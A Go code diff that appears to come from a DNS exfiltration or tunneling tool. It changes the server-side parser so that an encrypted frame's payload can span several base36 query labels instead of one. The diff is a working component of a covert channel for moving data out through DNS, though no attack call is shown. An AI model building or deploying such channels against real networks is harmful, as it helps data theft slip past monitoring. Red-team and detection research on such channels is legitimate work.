@@ -212,12 +212,12 @@ func parseLabelEncodedExfilFrame(qname string, domains []string, aesKey []byte) 
 }
 
 func interpretEncryptedFrameLabels(labels []string, aesKey []byte) (*ExfilFrame, error) {
-	if len(labels) != 2 {
-		return nil, fmt.Errorf("expected 2 labels, got %d", len(labels))
+	if len(labels) < 2 {
+		return nil, fmt.Errorf("expected at least 2 labels, got %d", len(labels))
 	}
 
 	metaLabel := labels[0]
-	payloadLabel := labels[1]
+	payloadLabels := labels[1:]
 	upperMeta := strings.ToUpper(metaLabel)
 	if !strings.HasPrefix(upperMeta, ExfilMetadataPrefix) {
 		return nil, fmt.Errorf("label missing exfil prefix")
@@ -253,23 +253,34 @@ func interpretEncryptedFrameLabels(labels []string, aesKey []byte) (*ExfilFrame,
 		return nil, fmt.Errorf("envelope missing phase flag (flags=0x%x)", envelope.Flags)
 	}
 
-	payload := strings.ToLower(payloadLabel)
-	if payload == strings.ToLower(ExfilPadLabel) {
-		payload = ""
+	payload, err := decodePayloadLabels(payloadLabels)
+	if err != nil {
+		return nil, err
 	}
-	if frame.Phase == ExfilFrameChunk {
-		if payload == "" {
-			return nil, fmt.Errorf("chunk frame missing payload label")
-		}
-		if !isBase36Label(payload) {
-			return nil, fmt.Errorf("chunk payload label is not base36")
-		}
-		frame.Payload = payload
-	} else {
-		frame.Payload = payload
+	if frame.Phase == ExfilFrameChunk && payload == "" {
+		return nil, fmt.Errorf("chunk frame missing payload label")
 	}
+	frame.Payload = payload
 
 	return frame, nil
+}
+
+func decodePayloadLabels(labels []string) (string, error) {
+	if len(labels) == 0 {
+		return "", fmt.Errorf("payload label set cannot be empty")
+	}
+	if len(labels) == 1 && strings.EqualFold(labels[0], ExfilPadLabel) {
+		return "", nil
+	}
+	var builder strings.Builder
+	for _, label := range labels {
+		lower := strings.ToLower(label)
+		if !isBase36Label(lower) {
+			return "", fmt.Errorf("chunk payload label is not base36")
+		}
+		builder.WriteString(lower)
+	}
+	return builder.String(), nil
 }
 
 func parseFrameEnvelopePayload(payload []byte) (*frameEnvelope, error) {
